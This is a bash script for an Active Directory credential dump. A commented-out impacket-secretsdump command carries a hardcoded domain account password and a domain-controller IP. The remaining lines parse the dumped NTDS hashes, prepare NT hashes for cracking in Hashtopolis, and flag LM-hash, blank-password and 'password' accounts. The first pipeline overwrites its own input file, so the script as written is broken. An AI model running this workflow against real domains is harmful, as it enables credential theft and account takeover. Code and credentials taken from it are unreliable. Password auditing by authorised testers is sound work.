#!/bin/bash

#impacket-secretsdump corp.yamww.com/rapid7:'Rapid7!Rapid7!'@10.8.22.39 -user-status -outputfile log.NTDS.secretsdump
cat ntds.all | grep Enabled | grep -v '\$' | grep ::: | rev | cut -d ' ' -f2,3,4,5,6,7,8,9 | rev > ntds.all
echo "`wc -l ntds.all` user hashes gathered"

#NT Hashes for hashtopolis
cat ntds.all | cut -d : -f4 | sort -u > ntds.nt.hashtopolis
echo "`wc -l ntds.nt.hashtopolis` unique user password hashes"

#LM Hashes enabled
cat ntds.all | grep -av 'aad3b435b51404eeaad3b435b51404ee' > ntds.lm.hash.enabled
echo "`wc -l ntds.lm.hash.enabled` accounts with LM hashes enabled"

#Blank Password
cat ntds.all | grep -a '31d6cfe0d16ae931b73c59d7e0c089c0' > ntds.no.pass
echo "`wc -l ntds.no.pass` accounts with blank passwords"

cat ntds.all | grep -a '8846f7eaee8fb117ad06bdd830b7586c' > ntds.password.as.password
echo "`wc -l ntds.password.as.password` accounts with password as password"
